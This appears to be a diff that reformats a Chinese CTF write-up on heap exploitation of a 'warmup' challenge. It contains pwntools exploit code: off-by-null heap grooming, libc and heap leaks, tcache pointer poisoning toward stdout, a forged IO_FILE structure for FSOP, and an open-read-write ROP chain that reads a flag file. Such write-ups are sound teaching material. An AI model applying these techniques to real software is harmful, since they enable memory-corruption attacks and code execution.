@@ -62,8 +62,8 @@ add(0x410) # 6
 
 所以当我们在申请回来这两个的时候，由于我们add的时候默认输入八位的字符串，所以会讲这个Bk指针的第一位覆盖为0，正好bk指向最开始的chunk 3，这样又完成了伪造指针的一步。
 
-delete(6) 
-delete(2) 
+delete(6)
+delete(2)
 add(0x410) # 2
 add(0x410) # 6
 
@@ -71,7 +71,7 @@ add(0x410) # 6
 
 之后就是修改最开始6chunk的fd指针，并且不能修改之前的chunk size，之后通过off by null使得指向现在chunk 6的指针指向了最开始的chunk 3，自此就完成了对于指针的伪造过程。
 
-delete(6) 
+delete(6)
 delete(3)
 delete(5)
 
@@ -196,14 +196,14 @@ add(0x450, flat({0x438: p16(0x551)})) # 0
 
 add(0x410) # 2
 add(0x420) # 3
-add(0x410) # 6 
+add(0x410) # 6
 
-delete(6) 
-delete(2) 
+delete(6)
+delete(2)
 add(0x410) # 2
 add(0x410) # 6
 
-delete(6) 
+delete(6)
 delete(3)
 delete(5)
 
@@ -319,25 +319,10 @@ https://bbs.kanxue.com/user-home-991890.htm
 ```
 一
 前言
-```
-
-
-
-```
 二
 前置知识
-```
-
-
-
-```
 三
 warmup的脚本分析
-```
-
-
-
-```
 add(0x410) # 0
 add(0xe0) # 1
 add(0x430) # 2
@@ -352,50 +337,25 @@ delete(3)
 delete(6)
 
 delete(2)
-```
-
-
-
-```
 add(0x450, flat({0x438: p16(0x551)})) # 0
 
 add(0x410) # 2
 add(0x420) # 3
 add(0x410) # 6
-```
-
-
-
-```
-delete(6) 
-delete(2) 
+delete(6)
+delete(2)
 add(0x410) # 2
 add(0x410) # 6
-```
-
-
-
-```
-delete(6) 
+delete(6)
 delete(3)
 delete(5)
 
 add(0x4f0, b"a"*0x488 + p64(0x431)) # 3
 add(0x3b0) # 5
-```
-
-
-
-```
 add(0x108, b"a"*0x100 + p64(0x550))#4
 add(0x410)#6
 delete(3)
 add(0x10)#3
-```
-
-
-
-```
 show(6)
 io.recv(6)
 libc_base = u64(io.recv(6).ljust(8, b'x00')) - 0x219ce0
@@ -408,19 +368,9 @@ delete(6)
 show(8)
 io.recv(6)
 heap_addr = (u64(io.recv(5).ljust(8, b'x00')) << 12) + 0xc30
-```
-
-
-
-```
 delete(4)
 delete(10)
 add(0x80, b'a' * 0x48 + p64(0x401) + p64(((heap_addr + 0x470) >> 12) ^ (stdout_addr))[:-1])
-```
-
-
-
-```
 file1 = IO_FILE_plus_struct()
 file1.flags = 0
 file1._IO_read_ptr = pop_rbp
@@ -433,11 +383,6 @@ file1.chain = leave_ret
 file1._codecvt = stdout_addr
 file1._wide_data = stdout_addr - 0x48
 file1.vtable = libc.sym['_IO_wfile_jumps'] + libc_base - 0x20
-```
-
-
-
-```
 _flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有两个空格
 vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow即可
 _wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
@@ -445,22 +390,12 @@ _wide_data->_IO_write_base设置为0，即满足*(A + 0x18) = 0
 _wide_data->_IO_buf_base设置为0，即满足*(A + 0x30) = 0
 _wide_data->_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
 _wide_data->_wide_vtable->doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
-```
-
-
-
-```
 flag_addr = heap_addr + 0x470 + 0x100
 payload = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscallret) + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdxr12) + p64(0x50) + p64(0) + p64(read) + p64(pop_rdi) + p64(1) + p64(write)
 payload = payload.ljust(0x100, b'x00')
 payload += b'./flagx00'
 add(0x3f0, payload)
 add(0x3f0, bytes(file1))
-```
-
-
-
-```
 from pwn import *
 from pwncli import *
 io = process("./warmup")
@@ -505,14 +440,14 @@ add(0x450, flat({0x438: p16(0x551)})) # 0
 
 add(0x410) # 2
 add(0x420) # 3
-add(0x410) # 6 
+add(0x410) # 6
 
-delete(6) 
-delete(2) 
+delete(6)
+delete(2)
 add(0x410) # 2
 add(0x410) # 6
 
-delete(6) 
+delete(6)
 delete(3)
 delete(5)
 
@@ -575,18 +510,8 @@ payload += b'./flagx00'
 add(0x3f0, payload)
 add(0x3f0, bytes(file1))
 io.interactive()
-```
-
-
-
-```
 四
 攻击流程复现
-```
-
-
-
-```
 五
 总结
 ```
